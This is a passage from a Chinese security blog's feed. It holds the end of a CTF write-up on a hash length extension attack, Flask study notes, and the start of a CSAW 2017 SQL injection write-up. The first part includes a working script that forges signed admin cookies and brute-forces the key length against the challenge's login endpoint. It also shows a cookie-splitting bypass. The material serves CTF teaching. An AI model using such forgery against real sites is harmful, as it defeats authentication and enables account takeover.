<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170928/3.png?raw=true" alt=""></p>
<p>上面这图是SHA1加密算法的流程：首先有原始register值，然后将hash的字符串分组等初始化操作后进行复杂的数学运算，同时会生成新的register的值，供下一个chunk进行加密使用。</p>
<p>在hash.py中，SLHA1算法的原始register值有6个：a，b，c，d，e，f。它们在每个chunk加密后会被更新，以参与下一个chunk的加密。可以通过<code>self._h</code>进行赋值来直接指定SLHA1算法的register值。</p>
<p>对一个字符串进行SLHA1算法加密，可以通过调用update()来进行.<br>对加密字符串的初始化操作如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_produce_digest</span><span class="params">(self)</span>:</span></div><div class="line">	message = self._unprocessed</div><div class="line">	message_byte_length = self._message_byte_length + len(message)</div><div class="line">	message += <span class="string">b'\xfd'</span></div><div class="line">	message += <span class="string">b'\xab'</span> * ((<span class="number">56</span> - (message_byte_length + <span class="number">1</span>) % <span class="number">64</span>) % <span class="number">64</span>)</div><div class="line">	message_bit_length = message_byte_length * <span class="number">8</span></div><div class="line">	message += struct.pack(<span class="string">b'&gt;Q'</span>, message_bit_length)</div><div class="line"></div><div class="line">	h = _process_chunk(message[:<span class="number">64</span>], *self._h)</div><div class="line"></div><div class="line">	<span class="keyword">if</span> len(message) == <span class="number">64</span>:</div><div class="line">		<span class="keyword">return</span> h</div><div class="line"></div><div class="line">	<span class="keyword">return</span> _process_chunk(message[<span class="number">64</span>:], *h)</div></pre></td></tr></table></figure></p>
<p>message是要进行加密的字符串。它会先加上一个字节<code>\xfd</code>，之后再加上一堆的<code>\xab</code>，使得chunk的长度能满足整除64后余数为56。之后添上8个字节的长度描述符。接下去从<code>h = _process_chunk...</code>开始是对最后一个chunk的加密处理。</p>
<p>由于要进行padding，我们需要知道原本<code>xxxx|chybeta</code>的长度，但<code>xxx</code>是未知的，这个可以爆破解决。</p>
<p>借用一下人家的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> hash <span class="keyword">import</span> SLHA1</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">extend</span><span class="params">(digest, length, ext)</span>:</span></div><div class="line">    pad  = <span class="string">'\xfd'</span></div><div class="line">    pad += <span class="string">'\xab'</span> * ((<span class="number">56</span> - (length + <span class="number">1</span>) % <span class="number">64</span>) % <span class="number">64</span>)</div><div class="line">    pad += struct.pack(<span class="string">'&gt;Q'</span>, length * <span class="number">8</span>)</div><div class="line">    slha = SLHA1()</div><div class="line">    slha._h = [struct.unpack(<span class="string">'&gt;I'</span>, digest[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>)]</div><div class="line">    slha._message_byte_length = length + len(pad)</div><div class="line">    slha.update(ext)</div><div class="line">    <span class="keyword">return</span> (pad + ext, slha.digest())</div><div class="line"></div><div class="line">post = &#123;</div><div class="line">    <span class="string">'username'</span>: <span class="string">'chybeta'</span></div><div class="line">&#125;</div><div class="line">cookies = &#123;</div><div class="line">    <span class="string">'data'</span>: <span class="string">'GwgWlwVYqelmztYx1n//EfyTIU6cH8ab'</span>,</div><div class="line">    <span class="string">'user'</span>: <span class="string">'dXNlcg=='</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">orig_digest = cookies[<span class="string">'data'</span>].decode(<span class="string">'base64'</span>)</div><div class="line">orig_user = cookies[<span class="string">'user'</span>].decode(<span class="string">'base64'</span>)</div><div class="line"></div><div class="line">min_len = len(<span class="string">'|'</span>.join([<span class="string">'?'</span>, post[<span class="string">'username'</span>], orig_user]))</div><div class="line"><span class="keyword">for</span> length <span class="keyword">in</span> range(min_len, min_len+<span class="number">64</span>):</div><div class="line">    print(<span class="string">'[+] Trying length: &#123;&#125;'</span>.format(length))</div><div class="line">    ext, new_digest = extend(orig_digest, length, <span class="string">'admin'</span>)</div><div class="line">    cookies[<span class="string">'data'</span>] = new_digest.encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">    cookies[<span class="string">'user'</span>] = (orig_user + ext).encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>, <span class="string">''</span>)</div><div class="line">    r = requests.post(<span class="string">'https://extend-me-please.herokuapp.com/login'</span>, data=post, cookies=cookies)</div><div class="line">    <span class="keyword">if</span> <span class="string">'CTF&#123;'</span> <span class="keyword">in</span> r.text:</div><div class="line">        print(r.text)</div><div class="line">        <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170928/4.png?raw=true" alt=""></p>
<p>PS: 其实今天早上（17/9/29）自己也写了一个脚本，但有些问题，准备过会再调试一下。然后下课后，TT &amp;&amp; GG:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170928/5.png?raw=true" alt=""></p>
<p>网站居然下线了woc。。。。。</p>
<h2 id="法二：剑走偏锋：）"><a href="#法二：剑走偏锋：）" class="headerlink" title="法二：剑走偏锋：）"></a>法二：剑走偏锋：）</h2><p>这个算是非预期解。毕竟这题名字叫Extend me，明显就是考哈希长度扩展攻击。不过这个非预期解法也蛮好玩的。</p>
<p>先通过post参数，设置username为 “chybeta|admin”。接着服务器进行加密 SLHA1(“xxxx|chybeta|admin|user”)，这里的xxxx是指key，后面的user是服务器端默认的，中间的“chybeta|admin”即为变量username，这个加密过程对应：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">username = str(request.form.get(<span class="string">'username'</span>))  <span class="comment"># username = "chybeta|admin"</span></div><div class="line"><span class="keyword">if</span> request.cookies.get(<span class="string">'data'</span>) <span class="keyword">and</span> request.cookies.get(<span class="string">'user'</span>):</div><div class="line">	。。。</div><div class="line"><span class="keyword">else</span>:</div><div class="line">	。。。</div><div class="line">	<span class="comment"># 假设key的值为 xxxx</span></div><div class="line">	temp = <span class="string">'|'</span>.join([key,username,<span class="string">'user'</span>])  <span class="comment"># temp = xxxx|chybeta|admin|user</span></div><div class="line">	resp.set_cookie(<span class="string">'data'</span>,SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>))</div><div class="line">	<span class="comment"># data =  SLHA1("xxxx|chybeta|admin|user").encode('base64')...</span></div><div class="line">	resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line">	<span class="comment"># user = 'user'.encode('base64')</span></div><div class="line">	<span class="keyword">return</span> resp</div></pre></td></tr></table></figure></p>
<p>第二步，更改cookie中的user字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">原本：user = &quot;dXNlcg==&quot; # base64decode(&quot;dXNlcg==&quot;)=&quot;user&quot;。</div><div class="line">现在：user = &quot;YWRtaW58dXNlcg==&quot; # base64decode(&quot;YWRtaW58dXNlcg==&quot;) = &quot;admin|user&quot;。</div></pre></td></tr></table></figure></p>
<p>Cookie的data字段保持不变。post进的username改为”chybeta”<br>接下来仔细看一下关键验证代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">username = str(request.form.get(<span class="string">'username'</span>))  <span class="comment"># username = "chybeta"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> request.cookies.get(<span class="string">'data'</span>) <span class="keyword">and</span> request.cookies.get(<span class="string">'user'</span>):</div><div class="line">	data = str(request.cookies.get(<span class="string">'data'</span>)).decode(<span class="string">'base64'</span>).strip()</div><div class="line">	<span class="comment"># data =  SLHA1("xxxx|chybeta|admin|user")</span></div><div class="line"></div><div class="line">	user = str(request.cookies.get(<span class="string">'user'</span>)).decode(<span class="string">'base64'</span>).strip()</div><div class="line">	<span class="comment"># user =  "admin|user"			</span></div><div class="line"></div><div class="line">	<span class="comment"># 假设 key的值为xxxx</span></div><div class="line">	temp = <span class="string">'|'</span>.join([key,username,user])</div><div class="line">	<span class="comment"># temp = key + "|" +  username + "|" + user</span></div><div class="line">	<span class="comment"># temp = "xxxx" + "|" + "chybeta" + "|" + "admin|user"	= "xxxx|chybeta|admin|user"</span></div><div class="line"></div><div class="line">	<span class="comment"># data =  SLHA1("xxxx|chybeta|admin|user")</span></div><div class="line">	<span class="comment"># SLHA1(temp) = SLHA1("xxxx|chybeta|admin|user")</span></div><div class="line">	<span class="keyword">if</span> data != SLHA1(temp).digest():</div><div class="line">		temp = SLHA1(temp).digest().encode(<span class="string">'base64'</span>).strip().replace(<span class="string">'\n'</span>,<span class="string">''</span>)</div><div class="line">		resp = make_response(render_template(<span class="string">'welcome_new.html'</span>,name = username))</div><div class="line">		resp.set_cookie(<span class="string">'user'</span>,<span class="string">'user'</span>.encode(<span class="string">'base64'</span>).strip())</div><div class="line">		resp.set_cookie(<span class="string">'data'</span>,temp)</div><div class="line">		<span class="keyword">return</span> resp</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="comment"># user =  "admin|user"</span></div><div class="line">		<span class="keyword">if</span> <span class="string">'admin'</span> <span class="keyword">in</span> user: <span class="comment"># too lazy to check properly :p</span></div><div class="line">			<span class="comment">#  'admin' in "admin|user" OK!!!!</span></div><div class="line">			<span class="keyword">return</span> <span class="string">"Here you go : CTF&#123;XXXXXXXXXXXXXXXXXXXXXXXXX&#125;"</span></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">return</span> render_template(<span class="string">'welcome_back.html'</span>,name = username)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;哈希长度扩展攻击 以及一种奇葩解法&lt;/p&gt;
&lt;p&gt;已将该题收录至&lt;a href=&quot;https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/python/challenge-1.md&quot;&gt;Code-Audit-Challenges-python:1&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="哈希长度扩展攻击" scheme="http://chybeta.github.io/tags/%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>Flask Web开发笔记(1):程序的基本结构</title>
    <link href="http://chybeta.github.io/2017/09/20/Flask-Web%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0-1-%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84/"/>
    <id>http://chybeta.github.io/2017/09/20/Flask-Web开发笔记-1-程序的基本结构/</id>
    <published>2017-09-20T11:04:49.000Z</published>
    <updated>2017-09-23T06:00:49.900Z</updated>
    
    <content type="html"><![CDATA[<p>最近跟着<a href="https://book.douban.com/subject/26274202/" target="_blank" rel="external">狗书</a>和<a href="http://flask.pocoo.org/" target="_blank" rel="external">flask文档</a>学习Flask。结合官方文档对一些知识点做一些笔记，并做一些适当扩展。所以不太成体系甚至很零散，勿喷。<br><a id="more"></a></p>
<h1 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h1><p>Flask程序必须要创建一个程序实例，程序实例是Flask类的对象。如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</div><div class="line">app = Flask(__name__)</div></pre></td></tr></table></figure></p>
<p>对于该<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask" target="_blank" rel="external">Flask类</a>，其定义如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">flask</span>.<span class="title">Flask</span><span class="params">(import_name, static_path=None, static_url_path=None, static_folder=’static’, template_folder=’templates’, instance_path=None, instance_relative_config=False, root_path=None)</span></span></div></pre></td></tr></table></figure></p>
<p>第一个参数是必须要指定的。Flask用这个参数来找到相对于程序根目录的资源文件位置。如果是使用单一的模块(module)，使用<code>__name__</code>就行了。如果是使用一个包(package)的话，推荐硬编码进去。</p>
<h1 id="路由和视图函数"><a href="#路由和视图函数" class="headerlink" title="路由和视图函数"></a>路由和视图函数</h1><p>flask程序实例保存了一个URL到python函数的映射关系。当客户端发送请求，服务器将请求转发给flask程序实例，flask程序实例依照映射关系利用函数进行处理。处理URL和函数之间的关系称之为<a href="http://docs.jinkan.org/docs/flask/quickstart.html#routing" target="_blank" rel="external">路由</a>。而像下文的<code>index()</code>和<code>hello()</code>的处理函数，称之为视图函数。</p>
<p>可以使用<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.route" target="_blank" rel="external">app.route修饰器</a>来定义路由。(注：这里的app是前面已经创建好了的Flask类的对象)。</p>
<p>基本示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"hello world!"</span></div><div class="line"></div><div class="line"><span class="meta">@app.route('/hello')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"hello hello world!"</span></div></pre></td></tr></table></figure></p>
<p>在默认情况下，访问<code>http://localhost:5000/</code>时页面会打印出hello,world!，当访问<code>http://localhost:5000/hello</code>时，页面则会打印出hello hello world!。</p>
<p>也可以构造动态的URL。通过给URL加上变量，利用装饰器，可以对URL的变量来做出对应的变化。这些动态的部分/变量，需要被标记为<code>&lt;variable_name&gt;</code>或者<code>&lt;converter:variable_name&gt;</code>，这个部分将可以被作为命名参数传递到函数中。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;name&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(name)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"I'm %s"</span> % name</div><div class="line"></div><div class="line"><span class="meta">@app.route('/&lt;int:id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">userid</span><span class="params">(id)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The isinstance(id,int): %s"</span> % isinstance(id,int)</div></pre></td></tr></table></figure></p>
<p>访问：<code>http://localhost:5000/chybeta</code>，会将字符串<code>chybeta</code>传递到user函数中，并返回给客户都：I’m chybeta。</p>
<p>若是访问：<a href="http://localhost:5000/1" target="_blank" rel="external">http://localhost:5000/1</a> 则：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/1.png?raw=true" alt=""></p>
<p>在第二个例子中：<code>@app.route(&#39;/&lt;int:id&gt;&#39;)</code>，指定了一个转换器，将id转换为整型int。目前有以下几种转换器：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">类型</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">string</td>
<td style="text-align:left">默认。接受除了斜杠以外的文本</td>
</tr>
<tr>
<td style="text-align:left">int</td>
<td style="text-align:left">接受整数</td>
</tr>
<tr>
<td style="text-align:left">float</td>
<td style="text-align:left">同 int ，但是接受浮点数</td>
</tr>
<tr>
<td style="text-align:left">path</td>
<td style="text-align:left">和默认的相似，但也接受斜线</td>
</tr>
<tr>
<td style="text-align:left">any</td>
<td style="text-align:left">matches one of the items provided</td>
</tr>
<tr>
<td style="text-align:left">uuid</td>
<td style="text-align:left">接受uuid字符串</td>
</tr>
</tbody>
</table>
</div>
<p>path选择器的作用如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;path:paths&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">path</span><span class="params">(paths)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The path: %s"</span> % paths</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/2.png?raw=true" alt=""></p>
<p>也就是说，path选择器不会把斜线作为分隔符，而是作为匹配的一整个部分。</p>
<p>any选择器，未知，哪位解释下？</p>
<p>uuid，如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@app.route('/&lt;uuid:id&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">uuid</span><span class="params">(id)</span>:</span></div><div class="line">	<span class="keyword">return</span> <span class="string">"The uuid: %s"</span> % id</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170919/3.png?raw=true" alt=""></p>
<h1 id="flask的Web服务器"><a href="#flask的Web服务器" class="headerlink" title="flask的Web服务器"></a>flask的Web服务器</h1><p>在前面定义好程序实例app后，可以用<code>run()</code>方法来启动flask自带的Web服务器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	app.run(debug=<span class="keyword">True</span>)</div></pre></td></tr></table></figure></p>
<p><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.run" target="_blank" rel="external">run()</a>方法的定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run(host=None, port=None, debug=None, **options)</div></pre></td></tr></table></figure></p>
<p>在 debug 模式启用的情况下(debug=True)，服务器会对修改的代码自动重新加载。</p>
<p>另外，这个本身的服务器并不适用于生产环境。详情可见：<a href="http://flask.pocoo.org/docs/0.12/deploying/#deployment-options" target="_blank" rel="external">Deployment Options</a></p>
<h1 id="请求与响应循环"><a href="#请求与响应循环" class="headerlink" title="请求与响应循环"></a>请求与响应循环</h1><h2 id="程序与请求上下文"><a href="#程序与请求上下文" class="headerlink" title="程序与请求上下文"></a>程序与请求上下文</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</div><div class="line"></div><div class="line"><span class="meta">@app.route('/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></div><div class="line">	user_agent = request.headers.get(<span class="string">'User-Agent'</span>)</div><div class="line">	<span class="keyword">return</span> <span class="string">'&lt;p&gt;Your brower is %s&lt;/p&gt;'</span> % user_agent</div></pre></td></tr></table></figure>
<p>这里出现了一个<a href="http://flask.pocoo.org/docs/0.12/api/#flask.Request" target="_blank" rel="external">request类</a>。关于其介绍可以见<a href="http://flask.pocoo.org/docs/0.12/api/#flask.request" target="_blank" rel="external">这里</a>。对于传入的request数据，flask保存了一个全局变量<code>request</code>对象。在一个多线程的环境中，flask能确保特定的request对象在特定的线程中全局可访问。</p>
<p>有一些较为常用的attributes：</p>
<ol>
<li><p>request.headers: 以字典形式保存保存了request的头部。。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170921/3.png?raw=true" alt=""></p>
</li>
<li><p>request.method：指明了是GET还是POST方法等。</p>
</li>
<li>request.cookies： 以字典形式保存了cookie</li>
<li>…. 还有好多 遇到再补充。</li>
</ol>
<!-- 接下来介绍一下[flask的上下文](http://flask.pocoo.org/docs/0.12/templating/#standard-context)。 -->
<h2 id="请求调度"><a href="#请求调度" class="headerlink" title="请求调度"></a>请求调度</h2><p>接前面的URL映射关系与路由。除了使用<code>app.route()</code>修饰器来注册为事件的处理程序外，还有另外两种:</p>
<ol>
<li><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.add_url_rule" target="_blank" rel="external">flask.Flask.add_url_rule()</a></li>
</ol>
<ol>
<li><a href="http://flask.pocoo.org/docs/0.12/api/#flask.Flask.url_map" target="_blank" rel="external">flask.Flask.url_map</a></li>
</ol>
<p>这里不展开，详细可见<a href="http://flask.pocoo.org/docs/0.12/api/#url-route-registrations" target="_blank" rel="external">URL Route Registrations</a></p>
<h2 id="请求钩子"><a href="#请求钩子" class="headerlink" title="请求钩子"></a>请求钩子</h2><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><h1 id="Flask扩展"><a href="#Flask扩展" class="headerlink" title="Flask扩展"></a>Flask扩展</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近跟着&lt;a href=&quot;https://book.douban.com/subject/26274202/&quot;&gt;狗书&lt;/a&gt;和&lt;a href=&quot;http://flask.pocoo.org/&quot;&gt;flask文档&lt;/a&gt;学习Flask。结合官方文档对一些知识点做一些笔记，并做一些适当扩展。所以不太成体系甚至很零散，勿喷。&lt;br&gt;
    
    </summary>
    
      <category term="技术杂谈" scheme="http://chybeta.github.io/categories/%E6%8A%80%E6%9C%AF%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
    
      <category term="flask" scheme="http://chybeta.github.io/tags/flask/"/>
    
      <category term="开发" scheme="http://chybeta.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF 2017-LittleQuery-writeup</title>
    <link href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/"/>
    <id>http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-LittleQuery-writeup/</id>
    <published>2017-09-18T05:50:36.000Z</published>
    <updated>2017-09-18T13:34:08.236Z</updated>
    
    <content type="html"><![CDATA[<p>CSAW CTF 2017-LittleQuery-writeup<br>SQL注入漏洞<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">LittleQuery</div><div class="line">I&apos;ve got a new website for BIG DATA analytics!</div><div class="line">http://littlequery.chal.csaw.io</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>先看看功能.<br>有一个登陆点: <a href="http://littlequery.chal.csaw.io/login.php" target="_blank" rel="external">http://littlequery.chal.csaw.io/login.php</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/21.png?raw=true" alt=""></p>
<p>有一些敏感目录：<a href="http://littlequery.chal.csaw.io/js/" target="_blank" rel="external">http://littlequery.chal.csaw.io/js/</a><br>其中login.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">".form-signin"</span>).submit(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> $password = $(<span class="keyword">this</span>).find(<span class="string">"input[type=password]"</span>);</div><div class="line">    $password.val(CryptoJS.SHA1($password.val()).toString());</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>query.js:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> codeMirror = CodeMirror.fromTextArea(<span class="built_in">document</span>.getElementById(<span class="string">'editor'</span>), &#123;</div><div class="line">	<span class="attr">lineNumbers</span>: <span class="literal">true</span>,</div><div class="line">	<span class="attr">matchBrackets</span>: <span class="literal">true</span>,</div><div class="line">	<span class="attr">mode</span>: <span class="string">'javascript'</span>,</div><div class="line">&#125;);</div><div class="line"></div><div class="line">$(<span class="string">'#submit'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $(<span class="string">'#submit'</span>).addClass(<span class="string">'disabled'</span>);</div><div class="line">    $(<span class="string">'#spinner'</span>).removeClass(<span class="string">'invisible'</span>);</div><div class="line">    $(<span class="string">'#output'</span>).text(<span class="string">''</span>);</div><div class="line">    $.post(<span class="string">'/query.php'</span>,</div><div class="line">           &#123;</div><div class="line">               <span class="string">'code'</span>: codeMirror.getValue(),</div><div class="line">           &#125;,</div><div class="line">           <span class="function"><span class="keyword">function</span> (<span class="params">output</span>) </span>&#123;</div><div class="line">               $(<span class="string">'#output'</span>).text(output);</div><div class="line">               $(<span class="string">'#submit'</span>).removeClass(<span class="string">'disabled'</span>);</div><div class="line">               $(<span class="string">'#spinner'</span>).addClass(<span class="string">'invisible'</span>);</div><div class="line">           &#125;</div><div class="line">    );</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>查看源代码，发现有注释：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/12.png?raw=true" alt=""></p>
<p>同时由robots.txt，也能发现该页面： <a href="http://littlequery.chal.csaw.io/api/db_explore.php" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/13.png?raw=true" alt=""></p>
<p>若要preview ，会要求提供<code>db</code>和<code>table</code>参数。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/15.png?raw=true" alt=""></p>
<p>所以先一步一步的“schema”。<br><a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/14.png?raw=true" alt=""></p>
<p><a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/16.png?raw=true" alt=""></p>
<p><a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery&amp;table=user" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=schema&amp;db=littlequery&amp;table=user</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/17.png?raw=true" alt=""></p>
<p>db和table都知道了，接着尝试一下preview： <a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&amp;table=user" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&amp;table=user</a></p>
